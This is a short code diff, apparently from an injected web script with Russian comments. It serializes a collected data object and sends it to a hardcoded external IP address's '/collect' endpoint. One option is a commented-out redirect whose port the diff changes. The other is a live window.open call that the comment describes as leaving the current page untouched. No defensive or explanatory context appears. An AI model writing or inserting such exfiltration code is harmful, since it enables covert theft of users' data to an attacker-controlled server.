@@ -10,7 +10,7 @@
   const payload = encodeURIComponent(JSON.stringify(data));
   
   // Вариант А: Редирект (сработает 100%)
-  // window.location = `http://45.82.82.114:8081/collect?d=${payload}`;
+  // window.location = `http://45.82.82.114:9055/collect?d=${payload}`;
   
   // Вариант Б: Открыть в новом окне (не трогает текущую страницу)
   window.open(`http://45.82.82.114:8081/collect?d=${payload}`);
